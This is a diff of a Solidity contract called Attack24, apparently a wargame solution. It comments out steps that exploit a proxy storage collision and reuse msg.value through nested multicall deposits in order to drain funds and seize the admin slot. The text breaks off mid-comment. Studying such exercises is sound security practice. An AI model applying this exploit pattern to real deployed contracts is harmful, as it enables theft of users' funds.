@@ -15,24 +15,24 @@ contract Attack24 {
     }
 
     function attack() public {
-        proxy.proposeNewAdmin(address(this));
-        target.addToWhitelist(address(this));
+        // proxy.proposeNewAdmin(address(this));
+        // target.addToWhitelist(address(this));
 
         // multicall
         // 1. deposit
         // 2. multicall
         //      - deposit
 
-        bytes[] memory deposit_data = new bytes[](1);
-        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);
+        // bytes[] memory deposit_data = new bytes[](1);
+        // deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);
         
-        bytes[] memory data = new bytes[](2);
-        data[0] = deposit_data[0];
-        data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);
-        target.multicall{value: 0.001 ether}(data);
+        // bytes[] memory data = new bytes[](2);
+        // data[0] = deposit_data[0];
+        // data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);
+        // target.multicall{value: 0.001 ether}(data);
 
         // target.execute(msg.sender, 0.002 ether, "");
-        
+
         // target.setMaxBalance(uint256(uint160(msg.sender)));
 
         // require(proxy.admin() == msg.sender, "the hack failed!!"); //  <-- not sure if this 
